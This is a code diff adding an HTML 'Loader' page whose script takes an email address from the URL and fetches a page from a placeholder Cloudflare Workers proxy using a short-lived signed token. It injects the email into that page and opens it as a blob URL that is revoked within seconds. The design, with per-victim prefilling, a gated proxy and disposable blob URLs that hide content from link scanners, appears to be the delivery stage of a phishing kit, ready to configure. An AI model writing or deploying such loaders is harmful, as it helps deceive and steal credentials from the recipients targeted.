@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Loader</title>
+</head>
+<body>
+
+<script>
+(async function () {
+
+  /* ================= CONFIG ================= */
+  const WORKER_URL = 'https://YOUR-WORKER.workers.dev'; // <-- CHANGE
+  const SHARED_SECRET = 'CHANGE_THIS_SECRET';           // <-- CHANGE (same as worker)
+  /* ========================================== */
+
+  const params = new URLSearchParams(location.search);
+  const emailParam = params.get('email');
+  if (!emailParam) return;
+
+  const email = decodeURIComponent(emailParam);
+  const emailB64 = btoa(email);
+
+  async function sha256(input) {
+    const buf = await crypto.subtle.digest(
+      'SHA-256',
+      new TextEncoder().encode(input)
+    );
+    return [...new Uint8Array(buf)]
+      .map(b => b.toString(16).padStart(2, '0'))
+      .join('');
+  }
+
+  // Hash email
+  const emailHash = await sha256(emailB64);
+
+  // Token (30s TTL)
+  const ts = Date.now();
+  const sig = await sha256(ts + '|' + emailHash + '|' + SHARED_SECRET);
+  const token = btoa(`${ts}|${emailHash}|${sig}`);
+
+  // Fetch hardened proxy
+  const res = await fetch(
+    `${WORKER_URL}?t=${encodeURIComponent(token)}&h=${emailHash}`,
+    { cache: 'no-store' }
+  );
+
+  if (!res.ok) return;
+
+  let html = await res.text();
+
+  // Inject email safely
+  html = html.replace(
+    /<\/head>/i,
+    `<meta name="injected-email" content="${emailB64}"></head>`
+  );
+
+  // Create one-time blob
+  const blob = new Blob([html], { type: 'text/html' });
+  const blobURL = URL.createObjectURL(blob);
+
+  window.open(blobURL, '_blank');
+
+  // Revoke blob (one-time use)
+  setTimeout(() => URL.revokeObjectURL(blobURL), 6000);
+
+})();
+</script>
+
+</body>
+</html>
